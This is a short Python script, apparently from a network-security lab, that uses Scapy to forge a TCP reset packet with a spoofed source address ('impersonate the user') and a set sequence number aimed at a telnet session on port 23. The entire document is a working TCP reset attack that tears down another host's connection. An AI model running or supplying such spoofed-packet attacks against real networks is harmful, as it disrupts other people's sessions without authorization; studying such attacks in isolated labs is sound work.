#!/usr/bin/env python3
from scapy.all import *

ip = IP(src="10.9.0.6", dst="10.9.0.5") # impersonate the user
tcp = TCP(sport=34962, dport=23, flags="R", seq=2533241039)
pkt = ip/tcp
ls(pkt)

send(pkt, verbose=0)
